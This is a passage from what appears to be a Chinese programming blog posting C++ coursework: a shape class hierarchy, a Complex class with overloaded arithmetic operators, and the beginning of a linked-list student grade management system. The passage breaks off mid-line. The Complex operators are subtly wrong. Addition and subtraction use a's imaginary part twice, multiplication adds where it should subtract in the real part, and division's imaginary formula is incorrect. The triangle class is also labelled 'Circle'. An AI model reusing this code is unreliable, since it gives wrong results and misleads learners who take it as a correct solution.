class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Circle'area:"</span>&lt;&lt;length*length*<span class="number">3.14</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">triangle</span>:</span><span class="keyword">public</span> Graphic</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">triangle(<span class="keyword">double</span> a,<span class="keyword">double</span> b):Graphic(<span class="string">"Circle"</span>,a,b)&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//double i</span></span><br><span class="line">        <span class="comment">//i =</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"triangle'area:"</span>&lt;&lt;(length*tall)/<span class="number">2</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Graphic *gp;</span><br><span class="line"><span class="built_in">string</span> type;  <span class="comment">// 定义图形的类型</span></span><br><span class="line"><span class="keyword">double</span> value;</span><br><span class="line"><span class="keyword">double</span> tall;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"what'type"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;type;</span><br><span class="line"><span class="comment">// cout&lt;&lt;"what'value"&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">// cin&gt;&gt;value;</span></span><br><span class="line"><span class="keyword">if</span>(type==<span class="string">"Square"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"what'value"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;value;</span><br><span class="line">gp = <span class="keyword">new</span> Square(value);</span><br><span class="line">gp -&gt;show();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(type==<span class="string">"Circle"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"what'value"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;value;</span><br><span class="line">gp = <span class="keyword">new</span> Circle(value);</span><br><span class="line">gp -&gt;show();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(type==<span class="string">"triangle"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"what'value"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;value;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"what'tall"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;tall;</span><br><span class="line">gp = <span class="keyword">new</span> triangle(value,tall);</span><br><span class="line">gp -&gt;show();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目三-运算符重载"><a href="#题目三-运算符重载" class="headerlink" title="题目三 运算符重载"></a>题目三 运算符重载</h2><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span>&lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">class <span class="built_in">Complex</span>&#123;</span><br><span class="line">public:</span><br><span class="line"><span class="built_in">Complex</span>(double r=<span class="number">0.0</span>,double i=<span class="number">0.0</span>);</span><br><span class="line">void <span class="keyword">print</span>();</span><br><span class="line">friend <span class="built_in">Complex</span> operator+ (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b);</span><br><span class="line">friend <span class="built_in">Complex</span> operator- (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b);</span><br><span class="line">friend <span class="built_in">Complex</span> operator* (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b);</span><br><span class="line">friend <span class="built_in">Complex</span> operator/ (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b);</span><br><span class="line">private:</span><br><span class="line">double <span class="built_in">real</span>;</span><br><span class="line">double <span class="built_in">imag</span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">Complex</span>::<span class="built_in">Complex</span>(double r,double i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">real</span> = r;</span><br><span class="line"><span class="built_in">imag</span> = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Complex</span> operator+ (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Complex</span> temp;</span><br><span class="line">temp.<span class="built_in">real</span> = a.<span class="built_in">real</span> + b.<span class="built_in">real</span>;</span><br><span class="line">temp.<span class="built_in">imag</span> = a.<span class="built_in">imag</span> + a.<span class="built_in">imag</span>;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Complex</span> operator- (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Complex</span> temp;</span><br><span class="line">temp.<span class="built_in">real</span> = a.<span class="built_in">real</span> - b.<span class="built_in">real</span>;</span><br><span class="line">temp.<span class="built_in">imag</span> = a.<span class="built_in">imag</span> - a.<span class="built_in">imag</span>;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Complex</span> operator* (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Complex</span> temp;</span><br><span class="line">temp.<span class="built_in">real</span> = a.<span class="built_in">real</span> * b.<span class="built_in">real</span> + a.<span class="built_in">imag</span> * b.<span class="built_in">imag</span>;</span><br><span class="line">temp.<span class="built_in">imag</span> = a.<span class="built_in">real</span> * b.<span class="built_in">imag</span> + a.<span class="built_in">imag</span> * b.<span class="built_in">real</span>;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Complex</span> operator/ (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Complex</span> temp;</span><br><span class="line">double t;</span><br><span class="line">t = <span class="number">1</span>/(b.<span class="built_in">real</span> * b.<span class="built_in">real</span> + b.<span class="built_in">imag</span> * b.<span class="built_in">imag</span>);</span><br><span class="line">temp.<span class="built_in">real</span> = (a.<span class="built_in">real</span> * b.<span class="built_in">real</span> + a.<span class="built_in">imag</span> * b.<span class="built_in">imag</span>)*t;</span><br><span class="line">temp.<span class="built_in">imag</span> = (b.<span class="built_in">real</span> * b.<span class="built_in">imag</span> + a.<span class="built_in">imag</span> * b.<span class="built_in">real</span>)*t;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line">void <span class="built_in">Complex</span>::<span class="keyword">print</span>()</span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;<span class="built_in">real</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">imag</span>&gt;<span class="number">0</span>)</span><br><span class="line">cout&lt;&lt;<span class="string">"+"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">imag</span>!=<span class="number">0</span>)</span><br><span class="line">cout&lt;&lt;<span class="built_in">imag</span>&lt;&lt;'i'&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Complex</span> A1(<span class="number">2.3</span>,<span class="number">4.6</span>),A2(<span class="number">3.6</span>,<span class="number">2.8</span>),A3,A4,A5,A6;</span><br><span class="line">A3 = A1 + A2;</span><br><span class="line">A4 = A1 - A2;</span><br><span class="line">A5 = A1 * A2;</span><br><span class="line">A6 = A1 / A2;</span><br><span class="line">A1.<span class="keyword">print</span>();</span><br><span class="line">A2.<span class="keyword">print</span>();</span><br><span class="line">A3.<span class="keyword">print</span>();</span><br><span class="line">A4.<span class="keyword">print</span>();</span><br><span class="line">A5.<span class="keyword">print</span>();</span><br><span class="line">A6.<span class="keyword">print</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="学生管理系统"><a href="#学生管理系统" class="headerlink" title="学生管理系统"></a>学生管理系统</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> num;                                   <span class="comment">//总学生人数</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span> &#123;</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">studentMessage</span>;</span> <span class="comment">// 友员函数</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">string</span> ID;</span><br><span class="line">    <span class="built_in">string</span> name;</span><br><span class="line">    <span class="keyword">double</span> score[<span class="number">5</span>];                       <span class="comment">//1-4代表math、English、OPP和总成绩  ，0号单元空出</span></span><br><span class="line">    student * next;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    student();</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">getName</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> name;&#125;</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">getID</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> ID;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getMath</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> score[<span class="number">1</span>];&#125;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getEnglesh</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> score[<span class="number">2</span>];&#125;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getOPP</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> score[<span class="number">3</span>];&#125;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">gettotol</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> score[<span class="number">4</span>];&#125;</span><br><span class="line">    <span class="function">student* <span class="title">getNext</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> next;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">analyse</span><span class="params">(<span class="keyword">int</span> ,student * )</span></span>; <span class="comment">//分析成绩</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span></span>;                          <span class="comment">//打印成绩</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">()</span></span>;                          <span class="comment">//交换对象和对象-&gt;next的信息</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">student::student()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入学生学号 : "</span>;<span class="built_in">cin</span>&gt;&gt;ID;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入学生姓名 : "</span>;<span class="built_in">cin</span>&gt;&gt;name;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入学生的数学、英语和OPP成绩 : "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> a,b,c;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">    <span class="keyword">while</span>(a&lt;<span class="number">0</span>||a&gt;<span class="number">100</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入成绩有误，请重新输入: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;b;</span><br><span class="line">    <span class="keyword">while</span>(b&lt;<span class="number">0</span>||b&gt;<span class="number">100</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入成绩有误，请重新输入: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;c;</span><br><span class="line">    <span class="keyword">while</span>(c&lt;<span class="number">0</span>||c&gt;<span class="number">100</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入成绩有误，请重新输入: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;c;        </span><br><span class="line">    &#125;</span><br><span class="line">    score[<span class="number">1</span>]=a;</span><br><span class="line">    score[<span class="number">2</span>]=b;</span><br><span class="line">    score[<span class="number">3</span>]=c;</span><br><span class="line">    score[<span class="number">4</span>]=a+b+c;</span><br><span class="line">    next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> student::analyse(<span class="keyword">int</span> a,student * first)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> you=<span class="number">0</span>,liang=<span class="number">0</span>,zhong=<span class="number">0</span>,jige=<span class="number">0</span>,bujige=<span class="number">0</span>;</span><br><span class="line">    student * t=first;</span><br><span class="line">    <span class="keyword">double</span> average=<span class="number">0</span>;                   <span class="comment">//平均分</span></span><br><span class="line">    <span class="keyword">while</span>(t)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> b = <span class="keyword">int</span>(t-&gt;score[a]/<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">switch</span>(b)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:you++;<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:liang++;<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:zhong++;<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:jige++;<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:bujige++;</span><br><span class="line">        &#125;</span><br><span class="line">        average+=t-&gt;score[a];</span><br><span class="line">        t=t-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    average=average/num;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">" 考生总人数 : "</span>&lt;&lt;num&lt;&lt;<span class="string">"        平均分 : "</span>&lt;&lt;average&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n 优     良      中     及格    不及格  "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>&lt;&lt;you&lt;&lt;<span class="string">" \t"</span>&lt;&lt;liang&lt;&lt;<span class="string">" \t"</span>&lt;&lt;zhong&lt;&lt;<span class="string">"\t"</span>&lt;&lt;jige&lt;&lt;<span class="string">"\t"</span>&lt;&lt;bujige&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> student::display()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>&lt;&lt;setw(<span class="number">3</span>)&lt;&lt;ID&lt;&lt;<span class="string">"     "</span>&lt;&lt;setw(<span class="number">3</span>)&lt;&lt;name&lt;&lt;<span class="string">"      "</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">4</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;setw(<span class="number">3</span>)&lt;&lt;score[i]&lt;&lt;<span class="string">"      "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> student::swap()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="built_in">string</span> na,id;</span><br><span class="line">    <span class="keyword">double</span> sco[<span class="number">5</span>];</span><br><span class="line">    na=name;name=next-&gt;name;next-&gt;name=na;</span><br><span class="line">    id=ID;ID=next-&gt;ID;next-&gt;ID=id;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=<span class="number">4</span>;j++)</span><br><span class="line">    &#123;                                            </span><br><span class="line">        sco[j]=score[j];</span><br><span class="line">        score[j]=next-&gt;score[j];    </span><br><span class="line">        next-&gt;score[j]=sco[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">studentMessage</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    student * first;</span><br><span class="line">    student * last;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    studentMessage();</span><br><span class="line">    <span class="function">student* <span class="title">getFirst</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> first;&#125;</span><br><span class="line">    <span class="function">student* <span class="title">getLast</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> last;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getNum</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> num;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;                             <span class="comment">//向表中增加学生成绩记录</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">()</span></span>;                          <span class="comment">//在表中查找学生成绩记录</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">()</span></span>;                             <span class="comment">//在表中删除学生成绩记录</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">showOne</span><span class="params">()</span></span>;                         <span class="comment">//分析一门课的成绩</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">showAll</span><span class="params">()</span></span>;                         <span class="comment">//输出所有同学所有科目的成绩</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">()</span></span>;                            <span class="comment">//按一门课成绩或总成绩排序</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span>;                           <span class="comment">//清空所有信息并退出系统</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">studentMessage::studentMessage()</span><br><span class="line">&#123;</span><br><span class="line">    first=<span class="literal">NULL</span>;</span><br><span class="line">    last=<span class="literal">NULL</span>;</span><br><span class="line">    num=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> studentMessage::add() </span><br><span class="line">&#123;</span><br><span class="line">    student * t =<span class="keyword">new</span> student;</span><br><span class="line">    student *p = first;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;ID==t-&gt;ID)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span 